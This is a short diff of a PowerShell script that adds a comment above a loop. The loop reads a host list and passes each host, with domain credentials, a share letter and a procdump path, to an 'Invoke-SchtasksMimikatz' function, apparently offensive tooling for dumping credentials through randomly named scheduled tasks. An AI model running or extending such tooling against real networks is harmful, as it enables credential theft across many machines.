@@ -87,6 +87,8 @@ Param(
  $Taskname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 )
 
+#Not much to this. Just reads in a list of hosts and passes each host to the Invoke-SchtasksMimikatz module. Can add features later such
+#as wait time and stuff like that.
 Get-Content $HostList | Foreach-Object {Invoke-SchtasksMimikatz($_, $Domain, $User, $Pass, $LocalShareLetter, $ProcdumpLocation, $Taskname)}
 
 }
